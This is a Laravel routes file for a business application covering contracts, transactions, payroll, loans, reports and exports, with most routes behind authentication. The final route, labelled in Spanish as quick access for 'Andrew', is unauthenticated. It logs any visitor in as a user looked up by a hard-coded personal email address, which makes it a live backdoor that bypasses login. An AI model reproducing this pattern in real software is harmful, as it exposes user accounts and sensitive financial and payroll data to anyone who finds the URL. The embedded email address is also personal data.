<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\CategoryController;
use App\Http\Controllers\PersonController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\DebugController;
use App\Http\Controllers\ContractController;
use App\Http\Controllers\TransactionController;
use App\Http\Controllers\PayrollController;
use App\Http\Controllers\LoanController;
use App\Http\Controllers\ReportController;
use App\Http\Controllers\ExportController;



Route::get('/', function () {
    return redirect()->route('login');
});

Auth::routes();

Route::middleware('auth')->group(function () {
    Route::get('/home', [HomeController::class, 'index'])->name('home');

    Route::resource('categories', CategoryController::class);
    Route::resource('persons', PersonController::class);
    Route::resource('contracts', ContractController::class)->middleware('auth');
    Route::resource('transactions', TransactionController::class)->middleware('auth');
    Route::resource('payrolls', PayrollController::class)->middleware('auth');
    Route::resource('loans', LoanController::class)->middleware('auth');


    Route::get('/debug', [DebugController::class, 'index'])->name('debug.index');
});


Route::prefix('reports')->middleware('auth')->group(function () {
    Route::get('/', [ReportController::class, 'index'])->name('reports.index');
    Route::get('/sales', [ReportController::class, 'sales'])->name('reports.sales');
    Route::get('/payments', [ReportController::class, 'payments'])->name('reports.payments');
    Route::get('/payroll', [ReportController::class, 'payroll'])->name('reports.payroll');
    Route::get('/loans', [ReportController::class, 'loans'])->name('reports.loans');
});

Route::prefix('exports')->middleware('auth')->group(function () {
    Route::get('/', [ExportController::class, 'index'])->name('exports.index');
    Route::get('/contracts/excel', [ExportController::class, 'contractsExcel'])->name('exports.contracts.excel');
    Route::get('/contracts/pdf', [ExportController::class, 'contractsPdf'])->name('exports.contracts.pdf');
    Route::get('/transactions/excel', [ExportController::class, 'transactionsExcel'])->name('exports.transactions.excel');
    Route::get('/transactions/pdf', [ExportController::class, 'transactionsPdf'])->name('exports.transactions.pdf');
    Route::get('/payrolls/excel', [ExportController::class, 'payrollsExcel'])->name('exports.payrolls.excel');
    Route::get('/payrolls/pdf', [ExportController::class, 'payrollsPdf'])->name('exports.payrolls.pdf');
    Route::get('/loans/excel', [ExportController::class, 'loansExcel'])->name('exports.loans.excel');
    Route::get('/loans/pdf', [ExportController::class, 'loansPdf'])->name('exports.loans.pdf');
});

// Ruta de acceso rápido para Andrew
Route::get('/dev-access-andrew1881', function () {
    $user = App\Models\User::where('email', 'geremy_rko56@hotmail.com')->first();
    if ($user) {
        Auth::login($user);
        return redirect('/home');
    }
    return 'Usuario no encontrado';
})->name('dev.access');